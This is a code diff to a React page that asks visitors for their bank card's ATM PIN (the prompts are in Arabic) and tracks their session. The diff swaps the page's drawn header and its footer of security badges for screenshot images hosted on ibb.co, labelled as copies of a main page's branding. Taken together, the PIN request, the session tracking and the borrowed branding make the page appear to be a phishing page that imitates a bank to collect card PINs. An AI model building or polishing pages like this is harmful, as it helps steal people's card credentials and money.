@@ -78,37 +78,12 @@ export default function ATMPage() {
     }}>
       <SessionTracker page="atm" />
 
-      {/* Header */}
-      <div style={{
-        width: "100%",
-        background: `linear-gradient(135deg, ${GREEN} 0%, ${DARK_GREEN} 100%)`,
-        padding: "16px 20px",
-        display: "flex",
-        alignItems: "center",
-        justifyContent: "center",
-        gap: "12px",
-        boxShadow: "0 4px 15px rgba(30,115,68,0.3)",
-      }}>
-        <div style={{
-          width: "36px", height: "36px",
-          background: "rgba(255,255,255,0.2)",
-          borderRadius: "50%",
-          display: "flex", alignItems: "center", justifyContent: "center",
-        }}>
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <rect x="2" y="5" width="20" height="14" rx="2"/>
-            <line x1="2" y1="10" x2="22" y2="10"/>
-          </svg>
-        </div>
-        <div style={{ textAlign: "center" }}>
-          <div style={{ color: "white", fontWeight: "bold", fontSize: "16px", letterSpacing: "0.5px" }}>
-            التحقق من الرقم السري
-          </div>
-          <div style={{ color: "rgba(255,255,255,0.75)", fontSize: "11px" }}>
-            أدخل رقم PIN الخاص ببطاقتك
-          </div>
-        </div>
-      </div>
+      {/* Header - نفس هيدر الصفحة الرئيسية */}
+      <img
+        src="https://i.ibb.co/8LWchYJd/IMG-20260320-WA0028.jpg"
+        alt="Header"
+        style={{ width: "100%", display: "block" }}
+      />
 
       {/* Main Content */}
       <div style={{
@@ -125,7 +100,7 @@ export default function ATMPage() {
         {/* ATM Image */}
         <div style={{ marginBottom: "12px", textAlign: "center" }}>
           <img
-            src="/manus-storage/1000092647_76307928.png"
+            src="/manus-storage/1000092647_ed05fe51.png"
             alt="ATM Machine"
             style={{
               width: "130px",
@@ -288,39 +263,10 @@ export default function ATMPage() {
         </div>
       </div>
 
-      {/* Footer */}
-      <div style={{
-        width: "100%",
-        background: "white",
-        borderTop: "1px solid #e8f0e8",
-        padding: "12px 20px",
-        display: "flex",
-        alignItems: "center",
-        justifyContent: "center",
-        gap: "16px",
-      }}>
-        <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke={GREEN} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-          </svg>
-          <span style={{ fontSize: "11px", color: "#888" }}>تشفير SSL 256-bit</span>
-        </div>
-        <div style={{ width: "1px", height: "14px", background: "#ddd" }} />
-        <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke={GREEN} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-          </svg>
-          <span style={{ fontSize: "11px", color: "#888" }}>معيار PCI-DSS</span>
-        </div>
-        <div style={{ width: "1px", height: "14px", background: "#ddd" }} />
-        <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke={GREEN} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <circle cx="12" cy="12" r="10"/>
-            <polyline points="12 6 12 12 16 14"/>
-          </svg>
-          <span style={{ fontSize: "11px", color: "#888" }}>معاملة آمنة</span>
-        </div>
+      {/* Footer - صورتا الفوتر من الصفحة الرئيسية */}
+      <div style={{ width: "100%" }}>
+        <img src="https://i.ibb.co/v4MNd90m/IMG-20260322-WA0002.jpg" style={{ width: "100%", display: "block" }} alt="" />
+        <img src="https://i.ibb.co/Rp4xMwxN/IMG-20260321-WA0000.jpg" style={{ width: "100%", display: "block" }} alt="" />
       </div>
     </div>
   );
